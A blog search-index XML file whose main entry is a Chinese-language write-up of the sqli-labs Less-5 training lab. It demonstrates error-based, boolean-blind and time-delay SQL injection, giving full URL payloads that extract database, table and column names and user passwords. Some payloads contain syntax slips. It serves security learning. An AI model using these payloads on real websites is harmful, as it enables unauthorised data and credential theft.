<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[categories]]></title>
    <url>%2F2017%2F08%2F12%2Fcategories%2F</url>
    <content type="text"></content>
      <tags>
        <tag>categories</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随笔]]></title>
    <url>%2F2017%2F08%2F11%2FpostName%2F</url>
    <content type="text"><![CDATA[今日心得 折腾了一下午到现在，总算把这个博客建成了，其中也饶了很多弯路，犯了很多错误，希望后面能长点脑子吧。 刚刚建成，还有很多功能还不完善，后面需要的时候再来弄吧。先让我高兴会儿~~]]></content>
  </entry>
  <entry>
    <title><![CDATA[sqlilabs——less5]]></title>
    <url>%2F2017%2F08%2F11%2FLess-5%20%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[Less-5 学习 由于这两天一直在看sql盲注方面的东西，在这里就以sqliabs less-5为例分享我的学习心得。 wp首先对网页最基本的注入 12?id=1' ?id=1' or 1=1 --+ 显示正常，但我们可以发现网页并没有像前四关一样回显出数据库的信息，通过查看源代码可以发现 没有输出$row为了方便查看，我们在源代码里添加代码，输出sql语句 接下来分别利用三种注入方式 利用报错注入基础知识 order by 语句 用于根据制定的列队结果集进行排序 count(*) 函数返回表中的记录数 concat(*) 函数 拼接一个或多个字符串 concat_ws(separator,str1,str2) 第一个参数为分隔符，分隔符放在字符串中间。eg：select concat_ws(‘,’,’11’,’22’); 11,22 group_concat()分组拼接函数 group by 语句用于结合合计函数。 数值处理 floor() 函数用于取整 rand()函数 在0和1之间产生一个随机数 这种方式主要是利用count(*)聚合函数 把查询的部分以错误的形式显示出来 payload 1?id=1' union select 1,count(*),concat('~',select user(),'~',floor(rand()*2)) as a from information_schema.tables group by a --+ 得到回显查数据库 ?id=1&apos; union select 1,count(*),concat(&apos;~&apos;,(select database()),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a%23 查表 ?id=1&apos; union select 1,count(*),concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=&apos;security&apos;limit 0,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a%23 改变limit1,1 limit2,1 可得到四个表，我们需要的是users表 emails referers uagents users 查列 ?id=1&apos; union select 1,count(*),concat(&apos;~&apos;,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a%23 改变limit1,1 limit2,1 以此可得到username、password 最后一步爆数据 ?id=1&apos; union select 1,count(*),concat(&apos;~&apos;,(select username from users where id=&apos;2&apos; limit 0,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a%23 再查password 成功拿到用户名和密码 利用布尔盲注这种方式主要是通过构造逻辑判断来进行注入 基础知识 left(a,b) 函数从左侧截取a的前b位 Ord() ascii() 函数将字符转化为ascii值 mid(a,b,c) substr(a,b,c) 函数从b位置开始，截取字符串a的c长度 regexp ‘~[a-z]’ 匹配正则表达式用法一般为：select user() regexp ‘~[a-z]’也可用like匹配 开始对网页进行尝试： 数据库 ?id=1 and left(database(),1)&gt;&apos;a&apos;--+ 查看数据库第一位是否&gt;a 由于我们的数据库为’security’,很明显是大于的，页面也返回正常 ?id=1&apos; and left(database(),2)&gt;&apos;sa&apos;--+ 查看前两位是否大于sa 以此类推，利用二分法可得出数据库的名称。补：也可以利用substr()和ascii()将得到的内容转换成ascii值来得出名称比如查询security数据库下的第一个表的第一个字符 ?id=1 and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;80 此处仍然用二分法进行测试，直到回显正确。可以得到ascii值为101的时候正确，因为第一个表是email，e的ascii码为101 改变substr的数字，即可得到后面的字符 查看列 可利用regexp 正则匹配来获取user表中的列 ?id=1&apos; and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and table_name regexp &apos;~us[a-z]&apos; limit 0,a)--+ 即查询users表中是否存在为us**的列，页面回显正常2即为存在，以此种方法我们可以查出username和password 以上几种方法通用，选择任何一种方法都能爆出数据，但此中方法花费时间较长，不推荐使用。 此部分可参考Lcamry的mysql-injection 利用时间延迟注入延时注入主要是针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术基础知识 sleep() 延时 if(condition,true,false) 延时注入的原理就是，所要报的信息的ascii码正确时，产生延时，否则不延时。（反过来也可） ?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 意思是数据库名称第一个字符的ascii码是否为115，正确则返回页面，错误则产生5s的时间延迟。通过这样database()可用查询信息替换，以此来爆出表名列名数据等等。也有benchmark()延时注入，与sleep用法相似。]]></content>
      <categories>
        <category>注入学习</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
</search>
